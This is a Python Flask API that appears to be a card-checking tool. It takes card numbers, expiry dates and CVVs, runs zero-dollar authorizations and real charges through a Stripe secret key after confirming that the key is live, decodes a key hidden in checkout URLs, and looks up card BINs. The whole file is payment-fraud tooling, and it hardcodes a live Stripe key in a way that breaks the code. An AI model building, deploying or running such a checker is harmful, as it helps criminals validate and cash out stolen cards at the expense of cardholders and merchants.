import asyncio
import aiohttp
import json
import re
import os
import time
from datetime import datetime
from flask import Flask, request, jsonify
from random import choices
from string import ascii_lowercase, ascii_letters, digits
from urllib import parse
from base64 import b64decode

app = Flask(__name__)

class StripeProcessor:
    def __init__(self, card: str = "", month: str = "01", year: str = str(datetime.now().year + 2), cvv: str = "000"):
        self.card = card.replace(" ", "").replace("-", "")
        self.month = month.zfill(2)
        self.year = year if "20" in year and len(year) == 4 else "20" + year
        self.cvv = cvv
        self.zip = "10080"
        # Get SK from environment
        self.sk = os.getenv("pk_live_51LRxCKLhnMXMK9tmfEjBA6JJbmTDiuctk5X6lrZGBGcwfO5pZhmdlRbocwdRIKcaNdT6Pr6mefD3qxAOokMPZ0EA0050jzOTF3", "")
        self.bin = card[:6] if card else ""
        
        if not self.sk:
            raise ValueError("STRIPE_SECRET_KEY environment variable not set")

    async def CheckBin(self, session):
        """Get BIN information"""
        try:
            async with session.get(f"https://bins.antipublic.cc/bins/{self.bin}") as response:
                if response.status != 200:
                    return {
                        "brand": "Unknown", "type": "Unknown", "level": "Unknown",
                        "bank": "Unknown", "country": "Unknown", "currency": "USD",
                        "flag": "🏳️", "country_code": "US"
                    }
                data = await response.json()
                return {
                    "brand": data.get('brand', "Unknown"),
                    "type": data.get("type", "Unknown"),
                    "level": data.get("level", "Unknown"),
                    "bank": data.get("bank", "Unknown"),
                    "country": data.get("country_name", "Unknown"),
                    "currency": data.get("country_currencies", ["USD"])[0],
                    "flag": data.get("country_flag", "🏳️"),
                    "country_code": data.get("country_code", "US")
                }
        except Exception:
            return {
                "brand": "Unknown", "type": "Unknown", "level": "Unknown",
                "bank": "Unknown", "country": "Unknown", "currency": "USD",
                "flag": "🏳️", "country_code": "US"
            }

    async def Auth(self, session):
        """Perform Authorization Check (0$ SetupIntent)"""
        start = int(time.time())
        
        # 1. Check SK validity
        url = "https://api.stripe.com/v1/balance"
        headers = {"Authorization": f"Bearer {self.sk}", "Content-Type": "application/x-www-form-urlencoded"}
        
        async with session.get(url=url, headers=headers) as response:
            data = await response.json()
            live = data.get("livemode", False)
            
            if response.status != 200:
                error = data.get("error", {}).get("type", "Unknown")
                return {
                    "success": False,
                    "type": "AUTHORIZATION",
                    "status": "DECLINED",
                    "response": f"SK Error: {error}",
                    "live": False
                }
            
            if not live:
                return {
                    "success": False,
                    "type": "AUTHORIZATION",
                    "status": "DECLINED",
                    "response": "SK is not live mode",
                    "live": False
                }

            currency = data.get("available", [{}])[0].get("currency", "USD").upper()
            available = data.get("available", [{}])[0].get("amount", 0) / 100
            pending = data.get("pending", [{}])[0].get("amount", 0) / 100

        # 2. Create checkout session
        url = "https://api.stripe.com/v1/checkout/sessions"
        headers = {"Authorization": f"Bearer {self.sk}"}
        data = {
            "mode": "payment",
            "payment_method_types[0]": "card",
            "line_items[0][price_data][currency]": "usd",
            "line_items[0][price_data][product_data][name]": "Auth Check",
            "line_items[0][price_data][unit_amount]": "100",
            "line_items[0][quantity]": "1",
            "success_url": "https://t.me/Aayco",
            "cancel_url": "https://t.me/ro_uka",
        }
        
        async with session.post(url=url, headers=headers, data=data) as response:
            data = await response.json()
            checkout = data.get("url", None)
            if not checkout:
                return {
                    "success": False,
                    "type": "AUTHORIZATION",
                    "status": "DECLINED",
                    "response": "Failed to create checkout session",
                    "live": live
                }

            try:
                parts = checkout.split("#")
                url = parts[1]
                binary = parse.unquote(url)
                xor = b64decode(binary).decode("utf-8")
                data = ''.join(chr(ord(c) ^ 5) for c in xor)
                key = data.split('Key":"')[1]
                pkey = key.split('"')[0]
            except Exception:
                return {
                    "success": False,
                    "type": "AUTHORIZATION",
                    "status": "DECLINED",
                    "response": "Failed to extract payment key",
                    "live": live
                }

        # 3. Create customer
        url = "https://api.stripe.com/v1/customers"
        headers = {"Authorization": f"Bearer {self.sk}"}
        async with session.post(url=url, headers=headers) as response:
            data = await response.json()
            customer = data.get("id", None)
            if not customer:
                return {
                    "success": False,
                    "type": "AUTHORIZATION",
                    "status": "DECLINED",
                    "response": "Failed to create customer",
                    "live": live
                }

        # 4. Create setup intent
        url = "https://api.stripe.com/v1/setup_intents"
        headers = {"Authorization": f"Bearer {self.sk}"}
        data = {
            "customer": customer,
            "payment_method_types[]": "card",
            "usage": "off_session"
        }
        async with session.post(url=url, headers=headers, data=data) as response:
            data = await response.json()
            secret = data.get("client_secret", None)
            if not secret:
                return {
                    "success": False,
                    "type": "AUTHORIZATION",
                    "status": "DECLINED",
                    "response": "Failed to create setup intent",
                    "live": live
                }
            setup = secret.split("_secret_")[0]

        # 5. Get muid, guid, sid
        url = "https://m.stripe.com/6"
        headers = {
            'authority': 'm.stripe.com',
            'accept': '*/*',
            'content-type': 'text/plain;charset=UTF-8',
            'origin': 'https://m.stripe.network',
            'referer': 'https://m.stripe.network/',
            'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36',
        }
        async with session.post(url=url, headers=headers) as response:
            pass

        # 6. Confirm setup intent
        url = f"https://api.stripe.com/v1/setup_intents/{setup}/confirm"
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            'Accept': "application/json",
            'origin': "https://js.stripe.com",
            'referer': "https://js.stripe.com/",
        }
        
        year_short = self.year.replace('20', '') if '20' in self.year else self.year[-2:]
        data = f"return_url=https%3A%2F%2Fviralmark.ca%2Fverify-payment-callback&payment_method_data%5Btype%5D=card&payment_method_data%5Bcard%5D%5Bnumber%5D={self.card}&payment_method_data%5Bcard%5D%5Bcvc%5D={self.cvv}&payment_method_data%5Bcard%5D%5Bexp_year%5D={year_short}&payment_method_data%5Bcard%5D%5Bexp_month%5D={self.month}&use_stripe_sdk=false&key={pkey}&client_secret={secret}"
        
        async with session.post(url=url, headers=headers, data=data) as response:
            data = await response.json()
            end = int(time.time()) - start
            
            # Check for OTP/3DS requirement
            if data.get("status") == "requires_action":
                return {
                    "success": False,
                    "type": "AUTHORIZATION",
                    "status": "OTP_REQUIRED",
                    "response": "3D Secure authentication required (OTP)",
                    "live": live,
                    "time": f"{end}s",
                    "requires_action": True,
                    "next_action": data.get("next_action", {}),
                    "payment_intent": data.get("payment_intent"),
                    "available_balance": available,
                    "pending_balance": pending,
                    "currency": currency,
                    "amount_charged": 0.00,
                    "auth_type": "SetupIntent (0$ auth)"
                }
            
            if data.get("status") == "succeeded":
                return {
                    "success": True,
                    "type": "AUTHORIZATION",
                    "status": "APPROVED",
                    "response": "Card authorized successfully ✅",
                    "live": live,
                    "time": f"{end}s",
                    "available_balance": available,
                    "pending_balance": pending,
                    "currency": currency,
                    "amount_charged": 0.00,
                    "auth_type": "SetupIntent (0$ auth)",
                    "setup_intent": data.get("id")
                }
            elif data.get("error", False):
                error_msg = data.get('error', {}).get('message', 'Unknown error')
                error_code = data.get('error', {}).get('code', 'unknown')
                
                # Check for specific decline codes
                if "insufficient_funds" in error_msg.lower() or "insufficient" in error_msg.lower():
                    status = "DECLINED_INSUFFICIENT_FUNDS"
                elif "card_declined" in error_code or "declined" in error_msg.lower():
                    status = "DECLINED"
                elif "expired" in error_msg.lower():
                    status = "DECLINED_EXPIRED"
                elif "incorrect" in error_msg.lower() or "invalid" in error_msg.lower():
                    status = "DECLINED_INVALID"
                else:
                    status = "DECLINED"
                    
                return {
                    "success": False,
                    "type": "AUTHORIZATION",
                    "status": status,
                    "response": error_msg,
                    "error_code": error_code,
                    "live": live,
                    "time": f"{end}s",
                    "available_balance": available,
                    "pending_balance": pending,
                    "currency": currency,
                    "amount_charged": 0.00,
                    "auth_type": "SetupIntent (0$ auth)"
                }
            else:
                return {
                    "success": False,
                    "type": "AUTHORIZATION",
                    "status": "DECLINED",
                    "response": "Unexpected response",
                    "live": live,
                    "time": f"{end}s",
                    "amount_charged": 0.00,
                    "auth_type": "SetupIntent (0$ auth)"
                }

    async def Charge(self, session, amount=100, currency="usd", description="Stripe Charge"):
        """Perform Actual Stripe Charge"""
        start = int(time.time())
        
        # 1. Check SK validity
        url = "https://api.stripe.com/v1/balance"
        headers = {"Authorization": f"Bearer {self.sk}", "Content-Type": "application/x-www-form-urlencoded"}
        
        async with session.get(url=url, headers=headers) as response:
            data = await response.json()
            live = data.get("livemode", False)
            
            if response.status != 200:
                error = data.get("error", {}).get("type", "Unknown")
                return {
                    "success": False,
                    "type": "CHARGE",
                    "status": "DECLINED",
                    "response": f"SK Error: {error}",
                    "live": False
                }
            
            if not live:
                return {
                    "success": False,
                    "type": "CHARGE",
                    "status": "DECLINED",
                    "response": "SK is not live mode",
                    "live": False
                }

            available = data.get("available", [{}])[0].get("amount", 0) / 100
            pending = data.get("pending", [{}])[0].get("amount", 0) / 100

        # 2. Create payment intent (actual charge)
        url = "https://api.stripe.com/v1/payment_intents"
        headers = {"Authorization": f"Bearer {self.sk}"}
        
        data = {
            "amount": amount,
            "currency": currency.lower(),
            "payment_method_types[]": "card",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": self.card,
            "payment_method_data[card][exp_month]": int(self.month),
            "payment_method_data[card][exp_year]": int(self.year),
            "payment_method_data[card][cvc]": self.cvv,
            "payment_method_data[billing_details][address][postal_code]": self.zip,
            "confirm": "true",
            "capture_method": "automatic",
            "description": description,
            "return_url": "https://t.me/Aayco"
        }
        
        async with session.post(url=url, headers=headers, data=data) as response:
            data = await response.json()
            end = int(time.time()) - start
            
            # Check for OTP/3DS requirement
            if data.get("status") == "requires_action":
                return {
                    "success": False,
                    "type": "CHARGE",
                    "status": "OTP_REQUIRED",
                    "response": "3D Secure authentication required (OTP)",
                    "requires_action": True,
                    "next_action": data.get("next_action", {}),
                    "payment_intent": data.get("id"),
                    "client_secret": data.get("client_secret"),
                    "live": live,
                    "time": f"{end}s",
                    "amount": amount / 100,
                    "currency": currency.upper()
                }
            
            # Check for errors/declines
            if "error" in data:
                error_msg = data.get("error", {}).get("message", "Unknown error")
                error_code = data.get("error", {}).get("code", "unknown")
                decline_code = data.get("error", {}).get("decline_code", "")
                
                # Determine status based on error
                if "insufficient_funds" in error_msg.lower() or "insufficient" in error_msg.lower():
                    status = "DECLINED_INSUFFICIENT_FUNDS"
                elif "card_declined" in error_code or "declined" in error_msg.lower():
                    status = "DECLINED"
                elif decline_code:
                    status = f"DECLINED_{decline_code.upper()}"
                elif "expired" in error_msg.lower():
                    status = "DECLINED_EXPIRED"
                elif "incorrect" in error_msg.lower() or "invalid" in error_msg.lower():
                    status = "DECLINED_INVALID"
                elif "do_not_honor" in error_msg.lower():
                    status = "DECLINED_DO_NOT_HONOR"
                elif "pickup_card" in error_msg.lower():
                    status = "DECLINED_PICKUP_CARD"
                elif "lost_card" in error_msg.lower() or "stolen" in error_msg.lower():
                    status = "DECLINED_LOST_STOLEN"
                else:
                    status = "DECLINED"
                
                return {
                    "success": False,
                    "type": "CHARGE",
                    "status": status,
                    "response": error_msg,
                    "error_code": error_code,
                    "decline_code": decline_code,
                    "live": live,
                    "time": f"{end}s",
                    "amount": amount / 100,
                    "currency": currency.upper(),
                    "available_balance": available,
                    "pending_balance": pending
                }
            
            # Check payment intent status
            status = data.get("status")
            if status == "succeeded":
                return {
                    "success": True,
                    "type": "CHARGE",
                    "status": "CHARGED",
                    "response": "Payment successful ✅",
                    "live": live,
                    "time": f"{end}s",
                    "amount": amount / 100,
                    "currency": currency.upper(),
                    "charge_id": data.get("id"),
                    "payment_method": data.get("payment_method"),
                    "available_balance": available,
                    "pending_balance": pending,
                    "description": description,
                    "receipt_url": data.get("charges", {}).get("data", [{}])[0].get("receipt_url")
                }
            elif status == "requires_payment_method":
                return {
                    "success": False,
                    "type": "CHARGE",
                    "status": "DECLINED",
                    "response": "Payment method declined",
                    "live": live,
                    "time": f"{end}s",
                    "amount": amount / 100,
                    "currency": currency.upper()
                }
            elif status == "requires_capture":
                return {
                    "success": True,
                    "type": "CHARGE",
                    "status": "AUTHORIZED",
                    "response": "Payment authorized, pending capture",
                    "live": live,
                    "time": f"{end}s",
                    "amount": amount / 100,
                    "currency": currency.upper(),
                    "charge_id": data.get("id")
                }
            else:
                return {
                    "success": False,
                    "type": "CHARGE",
                    "status": "DECLINED",
                    "response": f"Payment failed: {status}",
                    "live": live,
                    "time": f"{end}s",
                    "amount": amount / 100,
                    "currency": currency.upper(),
                    "status": status
                }

    async def AuthAndCharge(self, session, amount=100, currency="usd", description="Stripe Charge"):
        """First auth check, then charge if successful"""
        auth_result = await self.Auth(session)
        if not auth_result.get("success"):
            return {
                "auth": auth_result,
                "charge": None,
                "note": "Auth failed, charge not attempted"
            }
        
        # If auth successful, proceed with charge
        charge_result = await self.Charge(session, amount, currency, description)
        return {
            "auth": auth_result,
            "charge": charge_result,
            "note": "Auth successful, charge attempted"
        }

# ============= HELPER FUNCTIONS =============

def parse_cc(cc_string):
    """Parse CC|MM|YYYY|CVV format"""
    parts = cc_string.replace(" ", "").replace("-", "").split('|')
    if len(parts) != 4:
        raise ValueError("Invalid format. Use: CC|MM|YYYY|CVV")
    return {
        'cc': parts[0].strip(),
        'month': parts[1].strip(),
        'year': parts[2].strip(),
        'cvv': parts[3].strip()
    }

def validate_card(card):
    """Basic card validation"""
    card = card.replace(" ", "").replace("-", "")
    if not card.isdigit():
        return False
    if len(card) < 13 or len(card) > 19:
        return False
    return True

def get_status_message(status, is_auth=True, amount=None):
    """Get human-readable status message"""
    messages = {
        "APPROVED": "✅ Card Approved - Auth Successful",
        "CHARGED": f"✅ Charged ${amount/100:.2f} - Payment Successful" if amount else "✅ Charged - Payment Successful",
        "AUTHORIZED": f"✅ Authorized ${amount/100:.2f} - Pending Capture" if amount else "✅ Authorized - Pending Capture",
        "OTP_REQUIRED": "🔐 OTP Required - 3D Secure Authentication Needed",
        "DECLINED": "❌ Card Declined - Please try another card",
        "DECLINED_INSUFFICIENT_FUNDS": "❌ Insufficient Funds - Card has insufficient balance",
        "DECLINED_EXPIRED": "❌ Card Expired - Card has expired",
        "DECLINED_INVALID": "❌ Invalid Card Details - Check card information",
        "DECLINED_DO_NOT_HONOR": "❌ Do Not Honor - Issuer declined the transaction",
        "DECLINED_PICKUP_CARD": "⚠️ Pickup Card - Issuer requested card pickup",
        "DECLINED_LOST_STOLEN": "⚠️ Lost/Stolen Card - Card reported lost or stolen",
    }
    return messages.get(status, f"⚠️ {status}")

# ============= API ENDPOINTS =============

@app.route('/stripe/auth/', methods=['GET'])
@app.route('/stripe/auth', methods=['GET'])
def stripe_auth():
    """
    Perform Stripe Authorization Check (0$ auth)
    Usage: /stripe/auth?cc=4111111111111111|12|2026|123
    """
    try:
        cc_string = request.args.get('cc')
        
        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter",
                "status": False,
                "usage": "/stripe/auth?cc=CC|MM|YYYY|CVV"
            }), 400
        
        try:
            parts = parse_cc(cc_string)
            cc, month, year, cvv = parts['cc'], parts['month'], parts['year'], parts['cvv']
            
            if not validate_card(cc):
                return jsonify({"error": "Invalid card number", "status": False}), 400
                
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400
        
        processor = StripeProcessor(cc, month, year, cvv)
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            async def _run():
                async with aiohttp.ClientSession() as session:
                    result = await processor.Auth(session)
                    bin_info = await processor.CheckBin(session)
                    result['bin_info'] = bin_info
                    result['card'] = cc_string
                    result['card_masked'] = f"{cc[:6]}******{cc[-4:]}"
                    result['message'] = get_status_message(result.get('status', 'UNKNOWN'), True)
                    return result
            result = loop.run_until_complete(_run())
        finally:
            loop.close()
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"error": str(e), "status": False}), 500

@app.route('/stripe/charge/', methods=['GET'])
@app.route('/stripe/charge', methods=['GET'])
def stripe_charge_get():
    """
    Perform Stripe Charge (GET method)
    Usage: /stripe/charge?cc=4111111111111111|12|2026|123&amount=100&currency=usd
    """
    try:
        cc_string = request.args.get('cc')
        amount = request.args.get('amount', 100, type=int)
        currency = request.args.get('currency', 'usd')
        description = request.args.get('description', 'Stripe Charge')
        
        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter",
                "status": False,
                "usage": "/stripe/charge?cc=CC|MM|YYYY|CVV&amount=100&currency=usd"
            }), 400
        
        try:
            parts = parse_cc(cc_string)
            cc, month, year, cvv = parts['cc'], parts['month'], parts['year'], parts['cvv']
            
            if not validate_card(cc):
                return jsonify({"error": "Invalid card number", "status": False}), 400
                
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400
        
        if amount < 50:
            return jsonify({"error": "Minimum charge is $0.50 (50 cents)", "status": False}), 400
        
        processor = StripeProcessor(cc, month, year, cvv)
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            async def _run():
                async with aiohttp.ClientSession() as session:
                    result = await processor.Charge(session, amount, currency, description)
                    bin_info = await processor.CheckBin(session)
                    result['bin_info'] = bin_info
                    result['card'] = cc_string
                    result['card_masked'] = f"{cc[:6]}******{cc[-4:]}"
                    result['message'] = get_status_message(result.get('status', 'UNKNOWN'), False, amount)
                    return result
            result = loop.run_until_complete(_run())
        finally:
            loop.close()
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"error": str(e), "status": False}), 500

@app.route('/stripe/charge', methods=['POST'])
def stripe_charge_post():
    """
    Perform Stripe Charge (POST method)
    Body: {"cc": "4111111111111111", "month": "12", "year": "2026", "cvv": "123", "amount": 100, "currency": "usd"}
    """
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({"error": "Missing JSON body", "status": False}), 400
        
        cc = data.get('cc')
        month = data.get('month', '01')
        year = data.get('year', str(datetime.now().year + 2))
        cvv = data.get('cvv', '000')
        amount = data.get('amount', 100)
        currency = data.get('currency', 'usd')
        description = data.get('description', 'Stripe Charge')
        
        if not cc:
            return jsonify({"error": "Missing 'cc'", "status": False}), 400
        
        # Handle if cc is in CC|MM|YYYY|CVV format
        if '|' in cc:
            try:
                parts = parse_cc(cc)
                cc, month, year, cvv = parts['cc'], parts['month'], parts['year'], parts['cvv']
            except ValueError as e:
                return jsonify({"error": str(e), "status": False}), 400
        
        if not validate_card(cc):
            return jsonify({"error": "Invalid card number", "status": False}), 400
        
        if amount < 50:
            return jsonify({"error": "Minimum charge is $0.50 (50 cents)", "status": False}), 400
        
        processor = StripeProcessor(cc, month, year, cvv)
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            async def _run():
                async with aiohttp.ClientSession() as session:
                    result = await processor.Charge(session, amount, currency, description)
                    bin_info = await processor.CheckBin(session)
                    result['bin_info'] = bin_info
                    result['card'] = f"{cc}|{month}|{year}|{cvv}"
                    result['card_masked'] = f"{cc[:6]}******{cc[-4:]}"
                    result['message'] = get_status_message(result.get('status', 'UNKNOWN'), False, amount)
                    return result
            result = loop.run_until_complete(_run())
        finally:
            loop.close()
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"error": str(e), "status": False}), 500

@app.route('/stripe/auth-and-charge/', methods=['GET'])
@app.route('/stripe/auth-and-charge', methods=['GET'])
def stripe_auth_and_charge_get():
    """
    First auth check, then charge if successful (GET)
    Usage: /stripe/auth-and-charge?cc=4111111111111111|12|2026|123&amount=100&currency=usd
    """
    try:
        cc_string = request.args.get('cc')
        amount = request.args.get('amount', 100, type=int)
        currency = request.args.get('currency', 'usd')
        description = request.args.get('description', 'Stripe Charge')
        
        if not cc_string:
            return jsonify({
                "error": "Missing 'cc' parameter",
                "status": False,
                "usage": "/stripe/auth-and-charge?cc=CC|MM|YYYY|CVV&amount=100&currency=usd"
            }), 400
        
        try:
            parts = parse_cc(cc_string)
            cc, month, year, cvv = parts['cc'], parts['month'], parts['year'], parts['cvv']
            
            if not validate_card(cc):
                return jsonify({"error": "Invalid card number", "status": False}), 400
                
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400
        
        if amount < 50:
            return jsonify({"error": "Minimum charge is $0.50 (50 cents)", "status": False}), 400
        
        processor = StripeProcessor(cc, month, year, cvv)
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            async def _run():
                async with aiohttp.ClientSession() as session:
                    result = await processor.AuthAndCharge(session, amount, currency, description)
                    bin_info = await processor.CheckBin(session)

                    # Add bin info and card details to result
                    if result.get('auth'):
                        result['auth']['bin_info'] = bin_info
                        result['auth']['card'] = cc_string
                        result['auth']['card_masked'] = f"{cc[:6]}******{cc[-4:]}"
                        result['auth']['message'] = get_status_message(result['auth'].get('status', 'UNKNOWN'), True)

                    if result.get('charge'):
                        result['charge']['bin_info'] = bin_info
                        result['charge']['card'] = cc_string
                        result['charge']['card_masked'] = f"{cc[:6]}******{cc[-4:]}"
                        result['charge']['message'] = get_status_message(result['charge'].get('status', 'UNKNOWN'), False, amount)

                    return result
            result = loop.run_until_complete(_run())
            return jsonify(result)
        finally:
            loop.close()
        
    except Exception as e:
        return jsonify({"error": str(e), "status": False}), 500

@app.route('/stripe/bin/', methods=['GET'])
@app.route('/stripe/bin', methods=['GET'])
def stripe_bin_info():
    """
    Get BIN information
    Usage: /stripe/bin?bin=411111
    """
    try:
        bin_num = request.args.get('bin', '')[:6]
        if not bin_num:
            return jsonify({"error": "Missing 'bin' parameter", "status": False}), 400
        
        if not bin_num.isdigit():
            return jsonify({"error": "BIN must be numeric", "status": False}), 400
        
        processor = StripeProcessor(bin_num + "0000000000")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            async def _run():
                async with aiohttp.ClientSession() as session:
                    return await processor.CheckBin(session)
            bin_info = loop.run_until_complete(_run())
        finally:
            loop.close()
        
        return jsonify({
            "status": True,
            "bin": bin_num,
            "bin_info": bin_info
        })
        
    except Exception as e:
        return jsonify({"error": str(e), "status": False}), 500

@app.route('/stripe/health', methods=['GET'])
def stripe_health():
    """Health check endpoint"""
    sk_exists = bool(os.getenv("STRIPE_SECRET_KEY", ""))
    return jsonify({
        "status": "healthy",
        "service": "Stripe Payment API",
        "version": "1.0.0",
        "endpoints": [
            "/stripe/auth?cc=CC|MM|YYYY|CVV",
            "/stripe/charge?cc=CC|MM|YYYY|CVV&amount=100&currency=usd",
            "/stripe/auth-and-charge?cc=CC|MM|YYYY|CVV&amount=100&currency=usd",
            "/stripe/bin?bin=411111"
        ],
        "stripe_configured": sk_exists
    })

@app.route('/', methods=['GET'])
def index():
    """API Documentation"""
    return jsonify({
        "service": "Stripe Payment API",
        "version": "1.0.0",
        "status_messages": {
            "AUTH": {
                "APPROVED": "✅ Card Approved - Auth Successful",
                "OTP_REQUIRED": "🔐 OTP Required - 3D Secure Authentication Needed",
                "DECLINED": "❌ Card Declined",
                "DECLINED_INSUFFICIENT_FUNDS": "❌ Insufficient Funds",
                "DECLINED_EXPIRED": "❌ Card Expired",
                "DECLINED_INVALID": "❌ Invalid Card Details"
            },
            "CHARGE": {
                "CHARGED": "✅ Payment Successful - Money Charged",
                "AUTHORIZED": "✅ Payment Authorized - Pending Capture",
                "OTP_REQUIRED": "🔐 OTP Required - 3D Secure Authentication Needed",
                "DECLINED": "❌ Card Declined",
                "DECLINED_INSUFFICIENT_FUNDS": "❌ Insufficient Funds",
                "DECLINED_EXPIRED": "❌ Card Expired",
                "DECLINED_INVALID": "❌ Invalid Card Details",
                "DECLINED_DO_NOT_HONOR": "❌ Do Not Honor",
                "DECLINED_PICKUP_CARD": "⚠️ Pickup Card",
                "DECLINED_LOST_STOLEN": "⚠️ Lost/Stolen Card"
            }
        },
        "endpoints": {
            "/stripe/auth": {
                "method": "GET",
                "description": "Perform authorization check (0$ auth)",
                "params": {"cc": "CC|MM|YYYY|CVV (required)"},
                "example": "/stripe/auth?cc=4111111111111111|12|2026|123"
            },
            "/stripe/charge": {
                "method": "GET or POST",
                "description": "Perform actual Stripe charge",
                "params": {
                    "cc": "CC|MM|YYYY|CVV (required)",
                    "amount": "Amount in cents (default: 100)",
                    "currency": "Currency (default: usd)",
                    "description": "Charge description (optional)"
                },
                "example": "/stripe/charge?cc=4111111111111111|12|2026|123&amount=100&currency=usd"
            },
            "/stripe/auth-and-charge": {
                "method": "GET",
                "description": "First auth check, then charge if successful",
                "params": {
                    "cc": "CC|MM|YYYY|CVV (required)",
                    "amount": "Amount in cents (default: 100)",
                    "currency": "Currency (default: usd)"
                },
                "example": "/stripe/auth-and-charge?cc=4111111111111111|12|2026|123&amount=100"
            },
            "/stripe/bin": {
                "method": "GET",
                "description": "Get BIN information",
                "params": {"bin": "First 6 digits of card (required)"},
                "example": "/stripe/bin?bin=411111"
            }
        },
        "environment_variables": {
            "STRIPE_SECRET_KEY": "Your Stripe secret key (required)"
        },
        "warning": "⚠️ Charges will actually deduct money from the card! Use with caution."
    })

if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
